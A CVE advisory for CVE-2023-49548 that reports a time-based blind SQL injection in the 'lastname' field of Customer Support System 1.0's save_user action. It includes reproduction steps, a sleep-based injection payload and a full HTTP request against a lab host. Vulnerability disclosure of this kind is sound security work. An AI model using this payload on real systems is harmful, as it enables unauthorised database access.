# CVE-2023-49548
# Customer Support System 1.0 - SQL Injection Vulnerability in the "lastname" Parameter During "save_user" Operation

**Description**: A SQL Injection vulnerability exists in version 1 of the Customer Support System. A malicious attacker can issue SQL commands to the MySQL database when creating/editing a user through the vulnerable parameter 'lastname'. 
  
**Vulnerable Product Version**: Customer Support System 1.0  
**CVE Author**: Geraldo Alcântara  
**Date**: 28/11/2023  
**Confirmed on**: 19/12/2023  
**CVE**: CVE-2023-49548     
**Tested on**: Windows  
### Steps to reproduce:  
1- Log in to the application.  
2- Click on your user image and select "Manage Account."   
3- Insert the malicious payload into the "lastname" parameter. 
**payload**: '%20and%20(select*from(select(sleep(20)))a)--%20  
### Request:

```
POST /customer_support/ajax.php?action=save_user HTTP/1.1
Host: 192.168.68.182
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0
Accept: */*
Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 144
Origin: http://192.168.68.182
Connection: close
Referer: http://192.168.68.182/customer_support/index.php?page=department_list
Cookie: PHPSESSID=arlocktakq815fq1lpm5fjml9n

id=1&table=users&firstname=Administrator&middlename=teste&lastname='%20and%20(select*from(select(sleep(5)))a)--%20&username=admin&password=admin
```
Discoverer(s)/Credits:  
Geraldo Alcântara
